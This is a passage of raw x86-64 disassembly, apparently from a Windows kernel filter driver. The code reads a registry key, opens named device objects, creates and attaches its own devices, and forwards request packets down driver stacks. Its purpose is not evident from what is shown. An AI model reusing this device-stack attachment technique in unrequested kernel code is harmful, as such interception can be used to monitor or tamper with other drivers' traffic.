   140004306:	4c 89 b4 24 80 00 00 	mov    %r14,0x80(%rsp)
   14000430d:	00 
   14000430e:	ff 15 0c 0e 00 00    	call   *0xe0c(%rip)        # 0x140005120
   140004314:	85 c0                	test   %eax,%eax
   140004316:	0f 88 0d 01 00 00    	js     0x140004429
   14000431c:	48 8b 9c 24 e0 08 00 	mov    0x8e0(%rsp),%rbx
   140004323:	00 
   140004324:	48 85 db             	test   %rbx,%rbx
   140004327:	0f 84 fc 00 00 00    	je     0x140004429
   14000432d:	48 8d 84 24 e8 08 00 	lea    0x8e8(%rsp),%rax
   140004334:	00 
   140004335:	45 33 c9             	xor    %r9d,%r9d
   140004338:	45 33 c0             	xor    %r8d,%r8d
   14000433b:	ba 19 00 02 00       	mov    $0x20019,%edx
   140004340:	48 8b cb             	mov    %rbx,%rcx
   140004343:	4c 89 74 24 28       	mov    %r14,0x28(%rsp)
   140004348:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000434d:	ff 15 0d 0e 00 00    	call   *0xe0d(%rip)        # 0x140005160
   140004353:	85 c0                	test   %eax,%eax
   140004355:	0f 88 c5 00 00 00    	js     0x140004420
   14000435b:	48 8b 8c 24 e8 08 00 	mov    0x8e8(%rsp),%rcx
   140004362:	00 
   140004363:	48 8b 79 08          	mov    0x8(%rcx),%rdi
   140004367:	ff 15 43 0d 00 00    	call   *0xd43(%rip)        # 0x1400050b0
   14000436d:	48 85 ff             	test   %rdi,%rdi
   140004370:	0f 84 aa 00 00 00    	je     0x140004420
   140004376:	4d 8b 14 3c          	mov    (%r12,%rdi,1),%r10
   14000437a:	4c 39 35 e7 31 00 00 	cmp    %r14,0x31e7(%rip)        # 0x140007568
   140004381:	75 2c                	jne    0x1400043af
   140004383:	4d 8b 4a 08          	mov    0x8(%r10),%r9
   140004387:	49 8d 4a 08          	lea    0x8(%r10),%rcx
   14000438b:	48 8d 05 7e fb ff ff 	lea    -0x482(%rip),%rax        # 0x140003f10
   140004392:	81 fd 10 27 00 00    	cmp    $0x2710,%ebp
   140004398:	48 89 0d c9 31 00 00 	mov    %rcx,0x31c9(%rip)        # 0x140007568
   14000439f:	4c 89 0d ba 31 00 00 	mov    %r9,0x31ba(%rip)        # 0x140007560
   1400043a6:	49 0f 42 c7          	cmovb  %r15,%rax
   1400043aa:	48 89 01             	mov    %rax,(%rcx)
   1400043ad:	eb 07                	jmp    0x1400043b6
   1400043af:	4c 8b 0d aa 31 00 00 	mov    0x31aa(%rip),%r9        # 0x140007560
   1400043b6:	81 fd 10 27 00 00    	cmp    $0x2710,%ebp
   1400043bc:	73 1f                	jae    0x1400043dd
   1400043be:	41 8b 54 3d 00       	mov    0x0(%r13,%rdi,1),%edx
   1400043c3:	49 8b ca             	mov    %r10,%rcx
   1400043c6:	41 ff d1             	call   *%r9
   1400043c9:	44 8b 05 a4 31 00 00 	mov    0x31a4(%rip),%r8d        # 0x140007574
   1400043d0:	48 8d 15 f9 45 00 00 	lea    0x45f9(%rip),%rdx        # 0x1400089d0
   1400043d7:	4a 89 04 c2          	mov    %rax,(%rdx,%r8,8)
   1400043db:	eb 2e                	jmp    0x14000440b
   1400043dd:	41 8b 54 3d 00       	mov    0x0(%r13,%rdi,1),%edx
   1400043e2:	33 c0                	xor    %eax,%eax
   1400043e4:	4c 8d 84 24 d8 08 00 	lea    0x8d8(%rsp),%r8
   1400043eb:	00 
   1400043ec:	49 8b ca             	mov    %r10,%rcx
   1400043ef:	89 84 24 d8 08 00 00 	mov    %eax,0x8d8(%rsp)
   1400043f6:	41 ff d1             	call   *%r9
   1400043f9:	44 8b 05 74 31 00 00 	mov    0x3174(%rip),%r8d        # 0x140007574
   140004400:	48 8d 0d c9 45 00 00 	lea    0x45c9(%rip),%rcx        # 0x1400089d0
   140004407:	4a 89 04 c1          	mov    %rax,(%rcx,%r8,8)
   14000440b:	41 ff c0             	inc    %r8d
   14000440e:	48 8b cb             	mov    %rbx,%rcx
   140004411:	44 89 05 5c 31 00 00 	mov    %r8d,0x315c(%rip)        # 0x140007574
   140004418:	ff 15 ba 0c 00 00    	call   *0xcba(%rip)        # 0x1400050d8
   14000441e:	eb 09                	jmp    0x140004429
   140004420:	48 8b cb             	mov    %rbx,%rcx
   140004423:	ff 15 af 0c 00 00    	call   *0xcaf(%rip)        # 0x1400050d8
   140004429:	ff c6                	inc    %esi
   14000442b:	48 8d 0d 4e 31 00 00 	lea    0x314e(%rip),%rcx        # 0x140007580
   140004432:	3b 35 38 31 00 00    	cmp    0x3138(%rip),%esi        # 0x140007570
   140004438:	0f 82 72 fe ff ff    	jb     0x1400042b0
   14000443e:	4c 8b bc 24 90 08 00 	mov    0x890(%rsp),%r15
   140004445:	00 
   140004446:	4c 8b ac 24 a0 08 00 	mov    0x8a0(%rsp),%r13
   14000444d:	00 
   14000444e:	4c 8b a4 24 a8 08 00 	mov    0x8a8(%rsp),%r12
   140004455:	00 
   140004456:	48 8b bc 24 b0 08 00 	mov    0x8b0(%rsp),%rdi
   14000445d:	00 
   14000445e:	48 8b ac 24 c0 08 00 	mov    0x8c0(%rsp),%rbp
   140004465:	00 
   140004466:	48 8b 9c 24 d0 08 00 	mov    0x8d0(%rsp),%rbx
   14000446d:	00 
   14000446e:	48 8d 8c 24 90 00 00 	lea    0x90(%rsp),%rcx
   140004475:	00 
   140004476:	33 d2                	xor    %edx,%edx
   140004478:	41 b8 00 08 00 00    	mov    $0x800,%r8d
   14000447e:	4c 89 b4 24 e0 08 00 	mov    %r14,0x8e0(%rsp)
   140004485:	00 
   140004486:	e8 a5 09 00 00       	call   0x140004e30
   14000448b:	48 8d 15 ee 0f 00 00 	lea    0xfee(%rip),%rdx        # 0x140005480
   140004492:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140004497:	ff 15 63 0b 00 00    	call   *0xb63(%rip)        # 0x140005000
   14000449d:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   1400044a2:	4c 8d 44 24 58       	lea    0x58(%rsp),%r8
   1400044a7:	48 8d 8c 24 e0 08 00 	lea    0x8e0(%rsp),%rcx
   1400044ae:	00 
   1400044af:	ba 01 00 00 00       	mov    $0x1,%edx
   1400044b4:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   1400044b9:	c7 44 24 58 30 00 00 	movl   $0x30,0x58(%rsp)
   1400044c0:	00 
   1400044c1:	4c 89 74 24 60       	mov    %r14,0x60(%rsp)
   1400044c6:	c7 44 24 70 40 00 00 	movl   $0x40,0x70(%rsp)
   1400044cd:	00 
   1400044ce:	4c 89 74 24 78       	mov    %r14,0x78(%rsp)
   1400044d3:	4c 89 b4 24 80 00 00 	mov    %r14,0x80(%rsp)
   1400044da:	00 
   1400044db:	ff 15 3f 0c 00 00    	call   *0xc3f(%rip)        # 0x140005120
   1400044e1:	4c 8b b4 24 98 08 00 	mov    0x898(%rsp),%r14
   1400044e8:	00 
   1400044e9:	48 8b b4 24 b8 08 00 	mov    0x8b8(%rsp),%rsi
   1400044f0:	00 
   1400044f1:	85 c0                	test   %eax,%eax
   1400044f3:	0f 88 b9 00 00 00    	js     0x1400045b2
   1400044f9:	48 8d 15 90 12 00 00 	lea    0x1290(%rip),%rdx        # 0x140005790
   140004500:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140004505:	ff 15 f5 0a 00 00    	call   *0xaf5(%rip)        # 0x140005000
   14000450b:	48 8b 8c 24 e0 08 00 	mov    0x8e0(%rsp),%rcx
   140004512:	00 
   140004513:	48 8d 84 24 d8 08 00 	lea    0x8d8(%rsp),%rax
   14000451a:	00 
   14000451b:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140004520:	4c 8d 8c 24 90 00 00 	lea    0x90(%rsp),%r9
   140004527:	00 
   140004528:	48 8d 54 24 48       	lea    0x48(%rsp),%rdx
   14000452d:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140004533:	c7 44 24 20 00 10 00 	movl   $0x1000,0x20(%rsp)
   14000453a:	00 
   14000453b:	48 c7 84 24 e8 08 00 	movq   $0xfffffffffeced300,0x8e8(%rsp)
   140004542:	00 00 d3 ce fe 
   140004547:	ff 15 db 0b 00 00    	call   *0xbdb(%rip)        # 0x140005128
   14000454d:	85 c0                	test   %eax,%eax
   14000454f:	79 4c                	jns    0x14000459d
   140004551:	4c 8d 84 24 e8 08 00 	lea    0x8e8(%rsp),%r8
   140004558:	00 
   140004559:	33 d2                	xor    %edx,%edx
   14000455b:	33 c9                	xor    %ecx,%ecx
   14000455d:	ff 15 d5 0b 00 00    	call   *0xbd5(%rip)        # 0x140005138
   140004563:	48 8b 8c 24 e0 08 00 	mov    0x8e0(%rsp),%rcx
   14000456a:	00 
   14000456b:	4c 8d 9c 24 d8 08 00 	lea    0x8d8(%rsp),%r11
   140004572:	00 
   140004573:	4c 89 5c 24 28       	mov    %r11,0x28(%rsp)
   140004578:	4c 8d 8c 24 90 00 00 	lea    0x90(%rsp),%r9
   14000457f:	00 
   140004580:	48 8d 54 24 48       	lea    0x48(%rsp),%rdx
   140004585:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000458b:	c7 44 24 20 00 10 00 	movl   $0x1000,0x20(%rsp)
   140004592:	00 
   140004593:	ff 15 8f 0b 00 00    	call   *0xb8f(%rip)        # 0x140005128
   140004599:	85 c0                	test   %eax,%eax
   14000459b:	78 b4                	js     0x140004551
   14000459d:	48 8b 8c 24 e0 08 00 	mov    0x8e0(%rsp),%rcx
   1400045a4:	00 
   1400045a5:	c6 05 58 1a 00 00 00 	movb   $0x0,0x1a58(%rip)        # 0x140006004
   1400045ac:	ff 15 26 0b 00 00    	call   *0xb26(%rip)        # 0x1400050d8
   1400045b2:	33 c9                	xor    %ecx,%ecx
   1400045b4:	ff 15 de 0a 00 00    	call   *0xade(%rip)        # 0x140005098
   1400045ba:	48 81 c4 c8 08 00 00 	add    $0x8c8,%rsp
   1400045c1:	c3                   	ret
   1400045c2:	cc                   	int3
   1400045c3:	cc                   	int3
   1400045c4:	cc                   	int3
   1400045c5:	cc                   	int3
   1400045c6:	cc                   	int3
   1400045c7:	cc                   	int3
   1400045c8:	cc                   	int3
   1400045c9:	cc                   	int3
   1400045ca:	cc                   	int3
   1400045cb:	cc                   	int3
   1400045cc:	cc                   	int3
   1400045cd:	cc                   	int3
   1400045ce:	cc                   	int3
   1400045cf:	cc                   	int3
   1400045d0:	40 53                	rex push %rbx
   1400045d2:	48 83 ec 20          	sub    $0x20,%rsp
   1400045d6:	49 8b d8             	mov    %r8,%rbx
   1400045d9:	48 85 d2             	test   %rdx,%rdx
   1400045dc:	0f 84 8c 00 00 00    	je     0x14000466e
   1400045e2:	48 85 db             	test   %rbx,%rbx
   1400045e5:	74 7e                	je     0x140004665
   1400045e7:	49 c7 c1 f8 ff ff ff 	mov    $0xfffffffffffffff8,%r9
   1400045ee:	41 ba 08 00 00 00    	mov    $0x8,%r10d
   1400045f4:	41 bb 78 00 00 00    	mov    $0x78,%r11d
   1400045fa:	4c 2b c9             	sub    %rcx,%r9
   1400045fd:	4c 2b d1             	sub    %rcx,%r10
   140004600:	4c 8d 41 78          	lea    0x78(%rcx),%r8
   140004604:	66 66 66 66 0f 1f 84 	data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000460b:	00 00 00 00 00 
   140004610:	48 8b 05 69 44 00 00 	mov    0x4469(%rip),%rax        # 0x140008a80
   140004617:	49 83 c3 18          	add    $0x18,%r11
   14000461b:	49 83 c0 18          	add    $0x18,%r8
   14000461f:	49 81 fb 50 01 00 00 	cmp    $0x150,%r11
   140004626:	48 8b 48 08          	mov    0x8(%rax),%rcx
   14000462a:	49 8d 04 09          	lea    (%r9,%rcx,1),%rax
   14000462e:	4a 8b 4c 00 e8       	mov    -0x18(%rax,%r8,1),%rcx
   140004633:	49 89 48 e0          	mov    %rcx,-0x20(%r8)
   140004637:	48 8b 05 42 44 00 00 	mov    0x4442(%rip),%rax        # 0x140008a80
   14000463e:	48 8b 48 08          	mov    0x8(%rax),%rcx
   140004642:	49 8b 44 0b e8       	mov    -0x18(%r11,%rcx,1),%rax
   140004647:	49 89 40 e8          	mov    %rax,-0x18(%r8)
   14000464b:	48 8b 05 2e 44 00 00 	mov    0x442e(%rip),%rax        # 0x140008a80
   140004652:	48 8b 48 08          	mov    0x8(%rax),%rcx
   140004656:	49 8d 04 0a          	lea    (%r10,%rcx,1),%rax
   14000465a:	4a 8b 4c 00 e8       	mov    -0x18(%rax,%r8,1),%rcx
   14000465f:	49 89 48 f0          	mov    %rcx,-0x10(%r8)
   140004663:	7c ab                	jl     0x140004610
   140004665:	48 8b ca             	mov    %rdx,%rcx
   140004668:	ff 15 22 0b 00 00    	call   *0xb22(%rip)        # 0x140005190
   14000466e:	48 85 db             	test   %rbx,%rbx
   140004671:	74 09                	je     0x14000467c
   140004673:	48 8b cb             	mov    %rbx,%rcx
   140004676:	ff 15 94 0a 00 00    	call   *0xa94(%rip)        # 0x140005110
   14000467c:	48 83 c4 20          	add    $0x20,%rsp
   140004680:	5b                   	pop    %rbx
   140004681:	c3                   	ret
   140004682:	cc                   	int3
   140004683:	cc                   	int3
   140004684:	cc                   	int3
   140004685:	cc                   	int3
   140004686:	cc                   	int3
   140004687:	cc                   	int3
   140004688:	cc                   	int3
   140004689:	cc                   	int3
   14000468a:	cc                   	int3
   14000468b:	cc                   	int3
   14000468c:	cc                   	int3
   14000468d:	cc                   	int3
   14000468e:	cc                   	int3
   14000468f:	cc                   	int3
   140004690:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004695:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000469a:	57                   	push   %rdi
   14000469b:	48 81 ec 50 01 00 00 	sub    $0x150,%rsp
   1400046a2:	33 c0                	xor    %eax,%eax
   1400046a4:	48 8b f1             	mov    %rcx,%rsi
   1400046a7:	48 8b da             	mov    %rdx,%rbx
   1400046aa:	48 8d 4c 24 34       	lea    0x34(%rsp),%rcx
   1400046af:	33 ff                	xor    %edi,%edi
   1400046b1:	33 d2                	xor    %edx,%edx
   1400046b3:	41 b8 18 01 00 00    	mov    $0x118,%r8d
   1400046b9:	48 89 44 24 22       	mov    %rax,0x22(%rsp)
   1400046be:	89 44 24 2a          	mov    %eax,0x2a(%rsp)
   1400046c2:	66 89 7c 24 20       	mov    %di,0x20(%rsp)
   1400046c7:	66 89 44 24 2e       	mov    %ax,0x2e(%rsp)
   1400046cc:	c7 44 24 30 1c 01 00 	movl   $0x11c,0x30(%rsp)
   1400046d3:	00 
   1400046d4:	e8 57 07 00 00       	call   0x140004e30
   1400046d9:	48 8d 15 30 11 00 00 	lea    0x1130(%rip),%rdx        # 0x140005810
   1400046e0:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400046e5:	ff 15 15 09 00 00    	call   *0x915(%rip)        # 0x140005000
   1400046eb:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400046f0:	ff 15 b2 0a 00 00    	call   *0xab2(%rip)        # 0x1400051a8
   1400046f6:	48 85 c0             	test   %rax,%rax
   1400046f9:	74 52                	je     0x14000474d
   1400046fb:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140004700:	ff d0                	call   *%rax
   140004702:	85 c0                	test   %eax,%eax
   140004704:	78 63                	js     0x140004769
   140004706:	83 7c 24 34 06       	cmpl   $0x6,0x34(%rsp)
   14000470b:	73 09                	jae    0x140004716
   14000470d:	48 8b cb             	mov    %rbx,%rcx
   140004710:	ff 15 82 0a 00 00    	call   *0xa82(%rip)        # 0x140005198
   140004716:	fe 43 43             	incb   0x43(%rbx)
   140004719:	48 83 83 b8 00 00 00 	addq   $0x48,0xb8(%rbx)
   140004720:	48 
   140004721:	4c 8b 05 58 43 00 00 	mov    0x4358(%rip),%r8        # 0x140008a80
   140004728:	48 3b 35 49 2e 00 00 	cmp    0x2e49(%rip),%rsi        # 0x140007578
   14000472f:	74 5e                	je     0x14000478f
   140004731:	48 8b 05 58 43 00 00 	mov    0x4358(%rip),%rax        # 0x140008a90
   140004738:	48 8b 0d 49 43 00 00 	mov    0x4349(%rip),%rcx        # 0x140008a88
   14000473f:	48 3b 35 2a 43 00 00 	cmp    0x432a(%rip),%rsi        # 0x140008a70
   140004746:	75 28                	jne    0x140004770
   140004748:	48 8b f9             	mov    %rcx,%rdi
   14000474b:	eb 2e                	jmp    0x14000477b
   14000474d:	4c 8d 44 24 3c       	lea    0x3c(%rsp),%r8
   140004752:	48 8d 54 24 38       	lea    0x38(%rsp),%rdx
   140004757:	48 8d 4c 24 34       	lea    0x34(%rsp),%rcx
   14000475c:	45 33 c9             	xor    %r9d,%r9d
   14000475f:	ff 15 4b 0a 00 00    	call   *0xa4b(%rip)        # 0x1400051b0
   140004765:	84 c0                	test   %al,%al
   140004767:	75 9d                	jne    0x140004706
   140004769:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
   14000476e:	eb 2b                	jmp    0x14000479b
   140004770:	48 3b 35 01 43 00 00 	cmp    0x4301(%rip),%rsi        # 0x140008a78
   140004777:	48 0f 44 f8          	cmove  %rax,%rdi
   14000477b:	49 3b f8             	cmp    %r8,%rdi
   14000477e:	74 0f                	je     0x14000478f
   140004780:	48 3b f9             	cmp    %rcx,%rdi
   140004783:	74 0d                	je     0x140004792
   140004785:	48 3b f8             	cmp    %rax,%rdi
   140004788:	75 df                	jne    0x140004769
   14000478a:	48 8b c8             	mov    %rax,%rcx
   14000478d:	eb 03                	jmp    0x140004792
   14000478f:	49 8b c8             	mov    %r8,%rcx
   140004792:	48 8b d3             	mov    %rbx,%rdx
   140004795:	ff 15 b5 08 00 00    	call   *0x8b5(%rip)        # 0x140005050
   14000479b:	4c 8d 9c 24 50 01 00 	lea    0x150(%rsp),%r11
   1400047a2:	00 
   1400047a3:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   1400047a7:	49 8b 73 18          	mov    0x18(%r11),%rsi
   1400047ab:	49 8b e3             	mov    %r11,%rsp
   1400047ae:	5f                   	pop    %rdi
   1400047af:	c3                   	ret
   1400047b0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400047b5:	57                   	push   %rdi
   1400047b6:	48 83 ec 20          	sub    $0x20,%rsp
   1400047ba:	48 8b 82 b8 00 00 00 	mov    0xb8(%rdx),%rax
   1400047c1:	48 8b da             	mov    %rdx,%rbx
   1400047c4:	48 8b f9             	mov    %rcx,%rdi
   1400047c7:	80 38 16             	cmpb   $0x16,(%rax)
   1400047ca:	75 0f                	jne    0x1400047db
   1400047cc:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400047d1:	48 83 c4 20          	add    $0x20,%rsp
   1400047d5:	5f                   	pop    %rdi
   1400047d6:	e9 b5 fe ff ff       	jmp    0x140004690
   1400047db:	ff 15 bf 09 00 00    	call   *0x9bf(%rip)        # 0x1400051a0
   1400047e1:	48 8b 15 98 42 00 00 	mov    0x4298(%rip),%rdx        # 0x140008a80
   1400047e8:	4c 8b 0d a1 42 00 00 	mov    0x42a1(%rip),%r9        # 0x140008a90
   1400047ef:	4c 8b 05 92 42 00 00 	mov    0x4292(%rip),%r8        # 0x140008a88
   1400047f6:	4c 8b d8             	mov    %rax,%r11
   1400047f9:	48 3b 3d 78 2d 00 00 	cmp    0x2d78(%rip),%rdi        # 0x140007578
   140004800:	75 05                	jne    0x140004807
   140004802:	48 8b ca             	mov    %rdx,%rcx
   140004805:	eb 1e                	jmp    0x140004825
   140004807:	48 3b 3d 62 42 00 00 	cmp    0x4262(%rip),%rdi        # 0x140008a70
   14000480e:	75 05                	jne    0x140004815
   140004810:	49 8b c8             	mov    %r8,%rcx
   140004813:	eb 10                	jmp    0x140004825
   140004815:	48 3b 3d 5c 42 00 00 	cmp    0x425c(%rip),%rdi        # 0x140008a78
   14000481c:	0f 85 d7 00 00 00    	jne    0x1400048f9
   140004822:	49 8b c9             	mov    %r9,%rcx
   140004825:	48 85 c9             	test   %rcx,%rcx
   140004828:	0f 84 cb 00 00 00    	je     0x1400048f9
   14000482e:	8b 05 cc 17 00 00    	mov    0x17cc(%rip),%eax        # 0x140006000
   140004834:	4c 3b d8             	cmp    %rax,%r11
   140004837:	0f 85 9d 00 00 00    	jne    0x1400048da
   14000483d:	48 3b ca             	cmp    %rdx,%rcx
   140004840:	75 30                	jne    0x140004872
   140004842:	48 83 3d 4e 42 00 00 	cmpq   $0x0,0x424e(%rip)        # 0x140008a98
   140004849:	00 
   14000484a:	74 26                	je     0x140004872
   14000484c:	fe 43 43             	incb   0x43(%rbx)
   14000484f:	48 83 83 b8 00 00 00 	addq   $0x48,0xb8(%rbx)
   140004856:	48 
   140004857:	48 8b 0d 3a 42 00 00 	mov    0x423a(%rip),%rcx        # 0x140008a98
   14000485e:	48 8b d3             	mov    %rbx,%rdx
   140004861:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004866:	48 83 c4 20          	add    $0x20,%rsp
   14000486a:	5f                   	pop    %rdi
   14000486b:	48 ff 25 de 07 00 00 	rex.W jmp *0x7de(%rip)        # 0x140005050
   140004872:	49 3b c8             	cmp    %r8,%rcx
   140004875:	75 30                	jne    0x1400048a7
   140004877:	48 83 3d 21 42 00 00 	cmpq   $0x0,0x4221(%rip)        # 0x140008aa0
   14000487e:	00 
   14000487f:	74 26                	je     0x1400048a7
   140004881:	fe 43 43             	incb   0x43(%rbx)
   140004884:	48 83 83 b8 00 00 00 	addq   $0x48,0xb8(%rbx)
   14000488b:	48 
   14000488c:	48 8b 0d 0d 42 00 00 	mov    0x420d(%rip),%rcx        # 0x140008aa0
   140004893:	48 8b d3             	mov    %rbx,%rdx
   140004896:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000489b:	48 83 c4 20          	add    $0x20,%rsp
   14000489f:	5f                   	pop    %rdi
   1400048a0:	48 ff 25 a9 07 00 00 	rex.W jmp *0x7a9(%rip)        # 0x140005050
   1400048a7:	49 3b c9             	cmp    %r9,%rcx
   1400048aa:	75 2e                	jne    0x1400048da
   1400048ac:	48 8b 05 f5 41 00 00 	mov    0x41f5(%rip),%rax        # 0x140008aa8
   1400048b3:	48 85 c0             	test   %rax,%rax
   1400048b6:	74 22                	je     0x1400048da
   1400048b8:	fe 43 43             	incb   0x43(%rbx)
   1400048bb:	48 83 83 b8 00 00 00 	addq   $0x48,0xb8(%rbx)
   1400048c2:	48 
   1400048c3:	48 8b d3             	mov    %rbx,%rdx
   1400048c6:	48 8b c8             	mov    %rax,%rcx
   1400048c9:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400048ce:	48 83 c4 20          	add    $0x20,%rsp
   1400048d2:	5f                   	pop    %rdi
   1400048d3:	48 ff 25 76 07 00 00 	rex.W jmp *0x776(%rip)        # 0x140005050
   1400048da:	fe 43 43             	incb   0x43(%rbx)
   1400048dd:	48 83 83 b8 00 00 00 	addq   $0x48,0xb8(%rbx)
   1400048e4:	48 
   1400048e5:	48 8b d3             	mov    %rbx,%rdx
   1400048e8:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400048ed:	48 83 c4 20          	add    $0x20,%rsp
   1400048f1:	5f                   	pop    %rdi
   1400048f2:	48 ff 25 57 07 00 00 	rex.W jmp *0x757(%rip)        # 0x140005050
   1400048f9:	33 d2                	xor    %edx,%edx
   1400048fb:	48 8b cb             	mov    %rbx,%rcx
   1400048fe:	c7 43 30 01 00 00 c0 	movl   $0xc0000001,0x30(%rbx)
   140004905:	ff 15 0d 08 00 00    	call   *0x80d(%rip)        # 0x140005118
   14000490b:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004910:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
   140004915:	48 83 c4 20          	add    $0x20,%rsp
   140004919:	5f                   	pop    %rdi
   14000491a:	c3                   	ret
   14000491b:	cc                   	int3
   14000491c:	cc                   	int3
   14000491d:	cc                   	int3
   14000491e:	cc                   	int3
   14000491f:	cc                   	int3
   140004920:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004925:	57                   	push   %rdi
   140004926:	48 83 ec 50          	sub    $0x50,%rsp
   14000492a:	48 8b f9             	mov    %rcx,%rdi
   14000492d:	48 8d 15 ac 0e 00 00 	lea    0xeac(%rip),%rdx        # 0x1400057e0
   140004934:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140004939:	ff 15 c1 06 00 00    	call   *0x6c1(%rip)        # 0x140005000
   14000493f:	4c 8d 0d 52 41 00 00 	lea    0x4152(%rip),%r9        # 0x140008a98
   140004946:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   14000494b:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140004950:	ba ff 01 1f 00       	mov    $0x1f01ff,%edx
   140004955:	ff 15 5d 07 00 00    	call   *0x75d(%rip)        # 0x1400050b8
   14000495b:	8b d8                	mov    %eax,%ebx
   14000495d:	85 c0                	test   %eax,%eax
   14000495f:	75 16                	jne    0x140004977
   140004961:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
   140004966:	48 8b 41 08          	mov    0x8(%rcx),%rax
   14000496a:	48 89 05 27 41 00 00 	mov    %rax,0x4127(%rip)        # 0x140008a98
   140004971:	ff 15 39 07 00 00    	call   *0x739(%rip)        # 0x1400050b0
   140004977:	85 db                	test   %ebx,%ebx
   140004979:	0f 88 37 01 00 00    	js     0x140004ab6
   14000497f:	48 8d 15 72 0e 00 00 	lea    0xe72(%rip),%rdx        # 0x1400057f8
   140004986:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000498b:	ff 15 6f 06 00 00    	call   *0x66f(%rip)        # 0x140005000
   140004991:	4c 8d 0d 08 41 00 00 	lea    0x4108(%rip),%r9        # 0x140008aa0
   140004998:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   14000499d:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400049a2:	ba ff 01 1f 00       	mov    $0x1f01ff,%edx
   1400049a7:	ff 15 0b 07 00 00    	call   *0x70b(%rip)        # 0x1400050b8
   1400049ad:	8b d8                	mov    %eax,%ebx
   1400049af:	85 c0                	test   %eax,%eax
   1400049b1:	75 16                	jne    0x1400049c9
   1400049b3:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
   1400049b8:	48 8b 41 08          	mov    0x8(%rcx),%rax
   1400049bc:	48 89 05 dd 40 00 00 	mov    %rax,0x40dd(%rip)        # 0x140008aa0
   1400049c3:	ff 15 e7 06 00 00    	call   *0x6e7(%rip)        # 0x1400050b0
   1400049c9:	85 db                	test   %ebx,%ebx
   1400049cb:	0f 88 e5 00 00 00    	js     0x140004ab6
   1400049d1:	33 db                	xor    %ebx,%ebx
   1400049d3:	48 8d 05 9e 2b 00 00 	lea    0x2b9e(%rip),%rax        # 0x140007578
   1400049da:	45 33 c0             	xor    %r8d,%r8d
   1400049dd:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1400049e2:	44 8d 4b 22          	lea    0x22(%rbx),%r9d
   1400049e6:	33 d2                	xor    %edx,%edx
   1400049e8:	48 8b cf             	mov    %rdi,%rcx
   1400049eb:	c6 44 24 28 01       	movb   $0x1,0x28(%rsp)
   1400049f0:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   1400049f4:	ff 15 46 07 00 00    	call   *0x746(%rip)        # 0x140005140
   1400049fa:	85 c0                	test   %eax,%eax
   1400049fc:	75 3a                	jne    0x140004a38
   1400049fe:	48 8b 05 73 2b 00 00 	mov    0x2b73(%rip),%rax        # 0x140007578
   140004a05:	48 8d 15 d4 0d 00 00 	lea    0xdd4(%rip),%rdx        # 0x1400057e0
   140004a0c:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140004a11:	83 48 30 10          	orl    $0x10,0x30(%rax)
   140004a15:	ff 15 e5 05 00 00    	call   *0x5e5(%rip)        # 0x140005000
   140004a1b:	48 8b 0d 56 2b 00 00 	mov    0x2b56(%rip),%rcx        # 0x140007578
   140004a22:	4c 8d 05 57 40 00 00 	lea    0x4057(%rip),%r8        # 0x140008a80
   140004a29:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   140004a2e:	ff 15 54 07 00 00    	call   *0x754(%rip)        # 0x140005188
   140004a34:	85 c0                	test   %eax,%eax
   140004a36:	74 11                	je     0x140004a49
   140004a38:	8b c8                	mov    %eax,%ecx
   140004a3a:	85 c0                	test   %eax,%eax
   140004a3c:	79 0b                	jns    0x140004a49
   140004a3e:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140004a43:	48 83 c4 50          	add    $0x50,%rsp
   140004a47:	5f                   	pop    %rdi
   140004a48:	c3                   	ret
   140004a49:	48 8d 05 20 40 00 00 	lea    0x4020(%rip),%rax        # 0x140008a70
   140004a50:	41 b9 22 00 00 00    	mov    $0x22,%r9d
   140004a56:	45 33 c0             	xor    %r8d,%r8d
   140004a59:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140004a5e:	33 d2                	xor    %edx,%edx
   140004a60:	48 8b cf             	mov    %rdi,%rcx
   140004a63:	c6 44 24 28 01       	movb   $0x1,0x28(%rsp)
   140004a68:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   140004a6c:	ff 15 ce 06 00 00    	call   *0x6ce(%rip)        # 0x140005140
   140004a72:	85 c0                	test   %eax,%eax
   140004a74:	75 3a                	jne    0x140004ab0
   140004a76:	48 8b 05 f3 3f 00 00 	mov    0x3ff3(%rip),%rax        # 0x140008a70
   140004a7d:	48 8d 15 74 0d 00 00 	lea    0xd74(%rip),%rdx        # 0x1400057f8
   140004a84:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140004a89:	83 48 30 10          	orl    $0x10,0x30(%rax)
